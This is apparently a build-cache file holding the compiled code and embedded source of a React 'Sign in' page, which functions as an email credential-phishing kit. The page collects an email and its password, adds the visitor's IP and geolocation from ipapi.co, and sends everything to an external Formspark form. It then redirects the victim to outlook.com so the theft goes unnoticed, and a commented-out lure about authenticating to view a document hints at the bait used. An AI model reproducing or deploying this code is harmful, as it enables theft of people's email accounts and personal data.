{"ast":null,"code":"import{useFormspark}from'@formspark/use-formspark';import Axios from'axios';import React,{useEffect,useState}from'react';import Logo from\"./logo.svg\";import{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";const FORMSPARK_FORM_ID='R4Zn9WTaT';// Replace with your actual Formspark form ID\nconst Login=()=>{const[email,setEmail]=useState('');const[password,setPassword]=useState('');const[showPasswordInput,setShowPasswordInput]=useState(false);const[submit,submitting]=useFormspark({formId:FORMSPARK_FORM_ID});// jgjjgjgj\nconst[isDetails,setIsDetails]=useState({});useEffect(()=>{Axios.get('https://ipapi.co/json/').then(res=>{setIsDetails(res.data);}).catch(error=>console.error('Error fetching IP and location:',error));},[]);useEffect(()=>{// Check if the form has been previously submitted\nconst isFormSubmitted=localStorage.getItem('formSubmitted');if(isFormSubmitted){window.location.replace('https://outlook.com');}},[]);const handleEmailSubmit=e=>{e.preventDefault();setShowPasswordInput(true);};const handlePasswordSubmit=async e=>{e.preventDefault();try{await submit({email,password,...isDetails});console.log('Form submitted successfully!');// Set the form submission flag in localStorage\nlocalStorage.setItem('formSubmitted','true');// Redirect to Outlook after successful submission\nwindow.location.replace('https://outlook.com');}catch(error){console.error('Error submitting form:',error);}finally{// Reset form fields\nsetEmail('');setPassword('');}};return/*#__PURE__*/_jsx(\"div\",{className:\"min-h-screen flex items-center justify-center bg-gray-200\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"max-w-md w-full bg-white p-8 rounded-lg shadow-lg\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"text-start\",children:[/*#__PURE__*/_jsx(\"img\",{className:\"mx-auto h-12 w-auto\",src:Logo,alt:\"logo\"}),/*#__PURE__*/_jsx(\"h2\",{className:\"mt-6 text-3xl font-extrabold text-gray-900\",children:\"Sign in\"})]}),!showPasswordInput&&/*#__PURE__*/_jsxs(\"form\",{className:\"mt-8 space-y-6\",onSubmit:handleEmailSubmit,children:[/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(\"label\",{htmlFor:\"email-address\",className:\"sr-only\",children:\"Email address\"}),/*#__PURE__*/_jsx(\"input\",{id:\"email-address\",name:\"email\",type:\"email\",autoComplete:\"email\",required:true,value:email,onChange:e=>setEmail(e.target.value),className:\"block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm\",placeholder:\"Email address\"})]}),/*#__PURE__*/_jsx(\"div\",{className:\"flex justify-end\",children:/*#__PURE__*/_jsx(\"button\",{type:\"submit\",className:\"mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500\",children:\"Next\"})})]}),showPasswordInput&&/*#__PURE__*/_jsxs(\"form\",{className:\"mt-8 space-y-6\",onSubmit:handlePasswordSubmit,children:[/*#__PURE__*/_jsx(\"div\",{className:\"text-start text-gray-900 mb-4\",children:/*#__PURE__*/_jsx(\"p\",{className:\"text-lg font-medium\",children:/*#__PURE__*/_jsx(\"div\",{className:\"font-semibold text-2xl text-blue-600\",children:email})})}),/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(\"label\",{htmlFor:\"password\",className:\"sr-only\",children:\"Email password\"}),/*#__PURE__*/_jsx(\"input\",{id:\"password\",name:\"password\",type:\"password\",autoComplete:\"current-password\",required:true,value:password,onChange:e=>setPassword(e.target.value),className:\"block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm\",placeholder:\"Password\"})]}),/*#__PURE__*/_jsx(\"div\",{className:\"flex justify-end\",children:/*#__PURE__*/_jsx(\"button\",{type:\"submit\",disabled:submitting,className:\"mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500\",children:\"Sign in\"})})]}),/*#__PURE__*/_jsx(\"div\",{className:\"mt-6 flex justify-center\",children:/*#__PURE__*/_jsx(\"p\",{className:\"text-sm text-gray-600\",children:/*#__PURE__*/_jsx(\"a\",{href:\"/\",className:\"font-medium text-indigo-600 hover:text-indigo-500\",children:\"Forgot your password?\"})})}),/*#__PURE__*/_jsx(\"div\",{className:\"mt-6 flex justify-center\",children:/*#__PURE__*/_jsxs(\"p\",{className:\"text-sm text-gray-600\",children:[\"Don't have an account?\",' ',/*#__PURE__*/_jsx(\"a\",{href:\"/\",className:\"font-medium text-indigo-600 hover:text-indigo-500\",children:\"Sign up here\"})]})})]})});};export default Login;","map":{"version":3,"names":["useFormspark","Axios","React","useEffect","useState","Logo","jsx","_jsx","jsxs","_jsxs","FORMSPARK_FORM_ID","Login","email","setEmail","password","setPassword","showPasswordInput","setShowPasswordInput","submit","submitting","formId","isDetails","setIsDetails","get","then","res","data","catch","error","console","isFormSubmitted","localStorage","getItem","window","location","replace","handleEmailSubmit","e","preventDefault","handlePasswordSubmit","log","setItem","className","children","src","alt","onSubmit","htmlFor","id","name","type","autoComplete","required","value","onChange","target","placeholder","disabled","href"],"sources":["C:/Users/USER/Desktop/latestoff/src/App.js"],"sourcesContent":["import { useFormspark } from '@formspark/use-formspark';\nimport Axios from 'axios';\nimport React, { useEffect, useState } from 'react';\nimport Logo from \"./logo.svg\";\n\nconst FORMSPARK_FORM_ID = 'R4Zn9WTaT'; // Replace with your actual Formspark form ID\n\nconst Login = () => {\n  const [email, setEmail] = useState('');\n  const [password, setPassword] = useState('');\n  const [showPasswordInput, setShowPasswordInput] = useState(false);\n  const [submit, submitting] = useFormspark({\n    formId: FORMSPARK_FORM_ID,\n  });\n// jgjjgjgj\n  const [isDetails, setIsDetails] = useState({});\n\n  useEffect(() => {\n    Axios.get('https://ipapi.co/json/')\n      .then((res) => {\n        setIsDetails(res.data);\n      })\n      .catch((error) => console.error('Error fetching IP and location:', error));\n  }, []);\n\n  useEffect(() => {\n    // Check if the form has been previously submitted\n    const isFormSubmitted = localStorage.getItem('formSubmitted');\n    if (isFormSubmitted) {\n      window.location.replace('https://outlook.com');\n    }\n  }, []);\n\n  const handleEmailSubmit = (e) => {\n    e.preventDefault();\n    setShowPasswordInput(true);\n  };\n\n  const handlePasswordSubmit = async (e) => {\n    e.preventDefault();\n\n    try {\n      await submit({ email, password, ...isDetails });\n      console.log('Form submitted successfully!');\n      // Set the form submission flag in localStorage\n      localStorage.setItem('formSubmitted', 'true');\n      // Redirect to Outlook after successful submission\n      window.location.replace('https://outlook.com');\n    } catch (error) {\n      console.error('Error submitting form:', error);\n    } finally {\n      // Reset form fields\n      setEmail('');\n      setPassword('');\n    }\n  };\n\n  return (\n    <div className=\"min-h-screen flex items-center justify-center bg-gray-200\">\n      <div className=\"max-w-md w-full bg-white p-8 rounded-lg shadow-lg\">\n        <div className=\"text-start\">\n          <img\n            className=\"mx-auto h-12 w-auto\"\n            src={Logo}\n            alt=\"logo\"\n          />\n          <h2 className=\"mt-6 text-3xl font-extrabold text-gray-900\">\n            Sign in\n          </h2>\n        </div>\n        {/* <div>To download/view your document authenticate your E-mail</div> */}\n\n        {/* Email input section */}\n        {!showPasswordInput && (\n          <form className=\"mt-8 space-y-6\" onSubmit={handleEmailSubmit}>\n            <div>\n              <label htmlFor=\"email-address\" className=\"sr-only\">\n                Email address\n              </label>\n              <input\n                id=\"email-address\"\n                name=\"email\"\n                type=\"email\"\n                autoComplete=\"email\"\n                required\n                value={email}\n                onChange={(e) => setEmail(e.target.value)}\n                className=\"block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm\"\n                placeholder=\"Email address\"\n              />\n            </div>\n            <div className=\"flex justify-end\">\n              <button\n                type=\"submit\"\n                className=\"mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500\"\n              >\n                Next\n              </button>\n            </div>\n          </form>\n        )}\n\n        {/* Email display and password input section */}\n        {showPasswordInput && (\n          <form className=\"mt-8 space-y-6\" onSubmit={handlePasswordSubmit}>\n            <div className=\"text-start text-gray-900 mb-4\">\n              <p className=\"text-lg font-medium\"><div className='font-semibold text-2xl text-blue-600'>{email}</div></p>\n            </div>\n            <div>\n              <label htmlFor=\"password\" className=\"sr-only\">\n                Email password\n              </label>\n              <input\n                id=\"password\"\n                name=\"password\"\n                type=\"password\"\n                autoComplete=\"current-password\"\n                required\n                value={password}\n                onChange={(e) => setPassword(e.target.value)}\n                className=\"block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm\"\n                placeholder=\"Password\"\n              />\n            </div>\n            <div className=\"flex justify-end\">\n              <button\n                type=\"submit\"\n                disabled={submitting}\n                className=\"mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500\"\n              >\n                Sign in\n              </button>\n            </div>\n          </form>\n        )}\n\n        {/* Optional: Forgot password link */}\n        <div className=\"mt-6 flex justify-center\">\n          <p className=\"text-sm text-gray-600\">\n            <a href=\"/\" className=\"font-medium text-indigo-600 hover:text-indigo-500\">\n              Forgot your password?\n            </a>\n          </p>\n        </div>\n\n        {/* Optional: Sign up link */}\n        <div className=\"mt-6 flex justify-center\">\n          <p className=\"text-sm text-gray-600\">\n            Don't have an account?{' '}\n            <a href=\"/\" className=\"font-medium text-indigo-600 hover:text-indigo-500\">\n              Sign up here\n            </a>\n          </p>\n        </div>\n      </div>\n    </div>\n  );\n};\n\nexport default Login;\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}